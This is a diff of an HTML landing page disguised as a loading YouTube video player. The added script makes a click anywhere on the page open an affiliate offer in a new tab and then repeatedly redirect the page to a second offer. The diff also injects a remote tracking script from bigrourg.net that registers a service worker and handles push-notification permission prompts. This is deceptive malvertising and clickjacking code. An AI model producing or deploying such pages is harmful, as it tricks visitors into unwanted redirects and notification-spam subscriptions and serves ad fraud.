@@ -1,14 +1,11 @@
-<!DOCTYPE html><html lang="en"><head>
-  <base href="">
-
-  
-
-
+<!DOCTYPE html><html lang="en">
+<head>
+<base href="">
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta http-equiv="" content="ie=edge">
 <title>Loading</title>
-<link href="https://rspctdown.com/nxc4/jquery-ui.css" rel="stylesheet">
+<link href="./jquery-ui.css" rel="stylesheet">
 <style>
     html,
     body {
@@ -387,7 +384,7 @@ border: none;
 }
 
 </style>
-<script src="https://rspctdown.com/nxc4/jquery.min.js"></script>
+<script src="./jquery.min.js"></script>
 <script>
   function getURLParameter(name) {
   return decodeURI(
@@ -395,15 +392,11 @@ border: none;
   );
   }
   </script>
-<script>
-            function go_click() {
-            window.location = "https://trfransit.com/click";
-        }
-        </script>
+
 </head>
-<body onclick="go_click();">
+<body onclick="ctaclick();">
 <div class="cont">
-<img src="https://rspctdown.com/nxc4/loading.gif" alt="">
+<img src="./loading.gif" alt="">
 </div>
 <div class="ytp-chrome-bottom" data-layer="8">
 <div class="ytp-progress-bar-container" aria-disabled="true" style="height: 5px;">
@@ -483,5 +476,37 @@ border: none;
 </div>
 </div>
 </div>
+</div>
 
-</div></body></html>
+<script>
+    function ctaclick(){
+      window.onbeforeunload = null;
+      window.open("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1", "_blank");
+      
+      setInterval(afflowsmartlink, 1000);
+    }
+    
+    function afflowsmartlink(){
+      location.replace("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2");
+    }
+
+</script>
+
+<script>
+    var url = new URL(window.location.href);
+    var pci = url.searchParams.get('clickid');
+    var s = document.createElement('script');
+    s.src='//bigrourg.net/pfe/current/micro.tag.min.js?z=4978561'+'&ymid='+pci+'&sw=/sw-check-permissions-3b3e2.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+    document.head.appendChild(s);
+  </script>
+
+</body></html>
